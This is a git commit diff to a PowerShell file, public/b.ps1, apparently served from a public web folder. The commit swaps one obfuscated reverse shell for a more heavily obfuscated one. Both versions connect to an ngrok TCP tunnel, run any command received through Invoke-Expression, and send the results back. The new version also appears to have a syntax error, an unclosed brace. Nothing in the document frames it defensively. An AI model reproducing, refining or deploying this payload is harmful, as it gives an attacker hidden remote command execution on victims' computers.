ec46e7825535ac3d941b4835222e738c9cedf4dd
nankehang <nankehang@users.noreply.github.com>
2026-04-22 13:40:52 +0700

    new ps

--- public/b.ps1
+++ public/b.ps1
@@ -1,14 +1,5 @@
-$o = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t'
-$p = '0.tcp.ap.ngrok.io'
-$r = 14636
-$c = New-Object $o($p,$r)
-$s = $c.GetStream()
-[byte[]]$b = 0..65535|%{0}
-while(($i = $s.Read($b,0,$b.Length)) -ne 0){
-$d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
-$sb = (iex $d 2>&1 | Out-String) + 'PS ' + (pwd).Path + '> '
-$sb2 = ([text.encoding]::ASCII).GetBytes($sb)
-$s.Write($sb2,0,$sb2.Length)
-$s.Flush()
-}
-$c.Close()
+$__='S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t';$___='0.tcp.ap.ngrok.io';$____=14636;
+${_}=New-Object $__(${___},${____);${__}=${_}.GetStream();[byte[]]${___}=0..65535|%{0};
+while((${____}=${__}.Read(${___},0,${___}.Length))-ne 0){${_____}=(New-Object Text.ASCIIEncoding).GetString(${___},0,${____});
+${______}=(iex ${_____} 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> ';
+${_______}=([text.encoding]::ASCII).GetBytes(${______});${__}.Write(${_______},0,${_______}.Length);${__}.Flush()};${_}.Close()
